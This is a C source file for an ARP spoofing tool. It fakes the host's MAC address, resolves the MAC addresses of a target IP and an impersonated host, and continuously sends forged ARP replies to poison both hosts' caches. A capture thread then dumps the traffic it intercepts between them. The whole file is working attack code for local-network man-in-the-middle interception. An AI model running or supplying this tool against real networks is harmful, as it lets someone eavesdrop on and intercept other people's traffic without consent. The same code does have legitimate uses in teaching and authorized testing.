#include <stdio.h>
#include <stdlib.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <time.h>
#include <unistd.h>
#include <pcap/pcap.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <assert.h>
#include <errno.h>
#include "arp-spoof.h"

volatile sig_atomic_t sigint_received = 0;
pthread_t t1,t2;

int
generateRandomMacAddr(unsigned char* mac_addr)
{
    // Not true RNG but ... who cares ?
    srand((unsigned int) time(NULL));

    for(int i = 0; i < ETH_ALEN; i++){
        mac_addr[i] = rand() % 256;
    }
    // Avoid multicast address
    mac_addr[0] &= 0xFE;

    printf("Random MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", mac_addr[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }
    return 0;
}

int
changeMacAddr(unsigned char* mac_addr, char* interface)
{
    struct ifreq ifr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd == -1){
        printf("Error while opening socket to change mac addr");
        return EXIT_FAILURE;
    }

    strncpy(ifr.ifr_name, interface, strlen(interface)+1);
    memcpy(ifr.ifr_hwaddr.sa_data,mac_addr,ETH_ALEN);
    ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
    errno = 0;
    if(ioctl(sockfd, SIOCSIFHWADDR, &ifr) == -1){
        printf("\nCan't set the mac addr: ");
        for (int i = 0; i < ETH_ALEN; ++i) {
            printf("%02x%s", mac_addr[i], (i == ETH_ALEN - 1) ? " " : ":"); // Print the MAC address in the usual format
        }
        printf("for interface %s\n", interface);
        exit(EXIT_FAILURE);
    }
    return EXIT_SUCCESS;
}

int
getMacAddr(unsigned char original_mac[ETH_ALEN], const char* interface){

    struct ifreq ifr;
    int sockfd;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd == -1){
        printf("Error while opening socket to get mac addr");
        return EXIT_FAILURE;
    }
    strncpy(ifr.ifr_name, interface, strlen(interface));
    assert(ioctl(sockfd, SIOCGIFHWADDR, &ifr) != -1);
    close(sockfd);
    memcpy(original_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    return EXIT_SUCCESS;
}

int
resolveMacAddr(char *interface, unsigned char *target_ip, unsigned char *random_mac, unsigned char *resolved_mac)
{
    pcap_t *handle = prepareConnection(interface);
    unsigned char source_ip[4];
    if(inet_pton(AF_INET, getIpFromInterface(interface),source_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Broadcast mac
    unsigned char broadcast_mac[ETH_ALEN] =
                {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    Packet *packet = craftPacket(random_mac,
                                source_ip,
                                broadcast_mac,
                                target_ip,
                                ARPOP_REQUEST);


    // Send 5 ARP broadcast packet to "ensure" an answer from target
    for (int i=0; i<5; i++){
        if(sendArpPacket(handle, packet)  < 1 ){
            fprintf(stderr,"Error sending ARP packet when resolving mac addr");
            pcap_close(handle);
            exit(EXIT_FAILURE);
        }
    }

    if(receiveArpPacket(handle, resolved_mac) != 0){
        fprintf(stderr,"Error receiving ARP packet when resolving mac addr");
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }


    free(packet);
    pcap_close(handle);
    return 0;
}


char*
getIpFromInterface(char* name)
{
    int sockfd;
    struct ifreq ifr;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ-1);
    if(ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl error");
        exit(1);
    }
    close(sockfd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

Packet*
craftPacket(unsigned char *sender_mac, unsigned char* sender_ip, unsigned char *target_mac, unsigned char *target_ip, int ARPOP_CODE)    // Ethernet header
{
    struct ether_header ethernet_header;
    // Packet type ID field
    ethernet_header.ether_type = htons(ETHERTYPE_ARP);
    // set source mac addr
    memcpy(ethernet_header.ether_shost, sender_mac, ETH_ALEN);
    // set destination mac addr
    memcpy(ethernet_header.ether_dhost, target_mac, ETH_ALEN);

    // ARP header
    struct arphdr arp_header;
    // Format of hardware address
    arp_header.ar_hrd = htons(ARPHRD_ETHER);
    // Format of protocol address
    arp_header.ar_pro = htons(ETHERTYPE_IP);
    // Length of hardware address
    arp_header.ar_hln = ETH_ALEN;
    // Length of protocol address
    arp_header.ar_pln = 4;
    // ARP opcode
    arp_header.ar_op = htons(ARPOP_CODE);

    // ARP Body
    ArpBody *arp_body = calloc(1,sizeof(ArpBody));
    // set source mac addr
    memcpy(arp_body->ar_sha, sender_mac, ETH_ALEN);
    // set destination mac addr
    memcpy(arp_body->ar_tha, target_mac, ETH_ALEN);

    memcpy(arp_body->ar_sip, sender_ip, 4);
    memcpy(arp_body->ar_tip, target_ip, 4);

    ArpPacket *arp = calloc(1, sizeof(ArpPacket));
    memcpy(arp,&arp_header,sizeof(struct arphdr));
    memcpy(&arp->body,arp_body,sizeof(ArpBody));


    Packet *packet = calloc(1,sizeof(Packet));
    memcpy(packet,&ethernet_header,sizeof(struct ether_header));
    memcpy(&packet->arp,arp,sizeof(ArpPacket));

    return packet;
}

pcap_t*
prepareConnection(char* interface)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
    if (handle == NULL) {
        printf("Error opening device: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    return handle;
}

int
sendArpPacket(pcap_t *handle, Packet *packet)
{
    int nbBytes;
    if ((nbBytes = pcap_inject(handle, (unsigned char*)packet, sizeof(*packet))) < 1) {
        printf("Error sending packet: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    return nbBytes;
}

int
receiveArpPacket(pcap_t *handle, uint8_t mac[ETH_ALEN])
{
    const u_char *receiv_packet;
    struct pcap_pkthdr header;
    receiv_packet = pcap_next(handle, &header);
    if (receiv_packet == NULL) {
        fprintf(stderr, "No packet received.\n");
        return 1;
    }

    // Extract the MAC address from the response packet
    struct ether_header *eth = (struct ether_header *) receiv_packet;
    memcpy(mac, &eth->ether_shost, ETH_ALEN);

    return 0;
}

void*
threadSendArpPacket(void* tArgs)
{
    threadArgs *myArg = (threadArgs*)tArgs;
    pcap_t *h = prepareConnection(myArg->interface);

    while(1){
        sendArpPacket(h,&myArg->p[0]);
        // Added nanosleep because too much ARP packet are sended otherwise
        nanosleep((const struct timespec[]){{0, 50000L}}, NULL);
        sendArpPacket(h,&myArg->p[1]);
        // Check for a SIGINT signal
        if (sigint_received == 1) {
            // Exit the thread if a SIGINT signal is received
            break;
        }
    }
    pcap_close(h);
    pthread_exit(NULL);
}

void
packet_handler(u_char *param, const struct pcap_pkthdr *header, const
u_char *pkt_data)
{
    int i = 0;
    printf("Packet capture length: %d\n", header->caplen);
    printf("Packet total length: %d\n", header->len);
    printf("\n");
    printf("Packet hex dump:\n");
    for (i = 0; i < header->caplen; i++) {
        printf("%02x ", pkt_data[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
        else if ((i + 1) % 8 == 0) {
            printf(" ");
        }
    }
    printf("\n\n");
    printf("Packet ASCII dump:\n");
    for (i = 0; i < header->caplen; i++) {
        printf("%c%s%s",
               isprint(pkt_data[i]) ? pkt_data[i] : '.',
               ((i + 1) % 16 == 0 ) ? " " : "",
               ((i + 1) % 32 == 0 ) ? "\n" : "");
    }
    printf("\n\n\n");

}

void*
threadHandlePacket(void* tArgs)
{
    threadArgs *myArg = (threadArgs*)tArgs;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    bpf_u_int32 net;
    bpf_u_int32 mask;

    // Open the pcap device
    pcap_t *handle = prepareConnection(myArg->interface);

    // Get the network and mask information
    if(pcap_lookupnet(myArg->interface, &net, &mask, errbuf) == PCAP_ERROR){
        fprintf(stderr,"Error with pcap_lookupnet");
        exit(EXIT_FAILURE);
    }

    // Compile and apply the filter
   if (pcap_compile(handle, &fp, myArg->filter, 0, net) == PCAP_ERROR){
       fprintf(stderr,"Error with pcap_compile");
       exit(EXIT_FAILURE);
   }
    if(pcap_setfilter(handle, &fp) != 0){
        fprintf(stderr,"Error with pcap_filter");
        exit(EXIT_FAILURE);
    }

    // Start capturing packets and call function packet_handler
    pcap_loop(handle, -1, packet_handler, NULL);

    if (sigint_received == 1) {
        printf("SIGINT RECEIVED");
        // Exit the thread if a SIGINT signal is received
        pcap_close(handle);
        pthread_exit(NULL);
    }
    return NULL;
}

void sigint_handler(int sig) {

    sigint_received = 1;
    pthread_kill(t1,SIGINT);
    pthread_kill(t2,SIGINT);
}

int
main(int argc, char *argv[])
{
    AttackSettings settings = { 0 };

    if (argc != 4) {
        printf("Usage: %s <target_ip> <impersonate_ip> <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    struct sigaction sa = {{sigint_handler}};


    if (-1 == sigaction(SIGINT, &sa, NULL))
    {
        perror("sigaction() failed");
        exit(EXIT_FAILURE);
    }


    // Target IP
    printf("Target ip = %s\n", argv[1]);

    if(inet_pton(AF_INET,argv[1],settings.target_ip) == -1){
        printf("Error while converting target IP");
        exit(EXIT_FAILURE);
    }

    // Gateway IP
    if(inet_pton(AF_INET,argv[2],settings.impersonate_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Interface
    settings.interface = calloc(1,strlen(argv[3])+1);
    if(settings.interface == NULL){
        printf("Failed to allocate memory for %s", settings.interface);
        exit(EXIT_FAILURE);
    }
    strncpy(settings.interface,argv[3],strlen(argv[3]));
    strcat(settings.interface,"\0");
    printf("Interface = %s\n", settings.interface);


    getMacAddr(settings.original_mac, settings.interface);
    generateRandomMacAddr(settings.random_mac);
    changeMacAddr(settings.random_mac,settings.interface);


    printf("\nResolving Target MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.target_ip,
                   settings.random_mac,
                   settings.target_mac);

    printf("Target MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.target_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    printf("\nResolving Impersonate MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.impersonate_ip,
                   settings.random_mac,
                   settings.impersonate_mac);

    printf("Impersonate MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.impersonate_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    // Spoofed packet for target_ip
    Packet *p2 = craftPacket(settings.random_mac,
                             settings.impersonate_ip,
                              settings.target_mac,
                              settings.target_ip,
                              ARPOP_REPLY);

    // Spoofed packet for impersonate_ip
    Packet *p3 = craftPacket(settings.random_mac,
                              settings.target_ip,
                              settings.impersonate_mac,
                              settings.impersonate_ip,
                              ARPOP_REPLY);

    // THREAD TIME
    threadArgs tArgs;
    tArgs.interface = settings.interface;
    tArgs.p[0] = *p2;
    tArgs.p[1] = *p3;

    //filter == not arp and host argv[1] and host argv[2]\0
    tArgs.filter = calloc(1, 64);
    snprintf(tArgs.filter,64,
             "not arp and (host %s or host %s)", argv[1],argv[2]);


    //Spoofing thread
    pthread_create(&t1, NULL,&threadSendArpPacket,&tArgs);
    // Handler thread
    pthread_create(&t2, NULL,&threadHandlePacket,&tArgs);


    printf("Spoofing ...\n");
    while (sigint_received != 1){
        nanosleep((const struct timespec[]){{0,500000000L}}, NULL);
    }

    // Wait for the thread to exit
    //pthread_join(t1, NULL);
    //pthread_join(t2, NULL);

    changeMacAddr(settings.original_mac,settings.interface);

    free(p2);
    free(p3);
    free(settings.interface);
    free(tArgs.filter);

    return EXIT_SUCCESS;
}


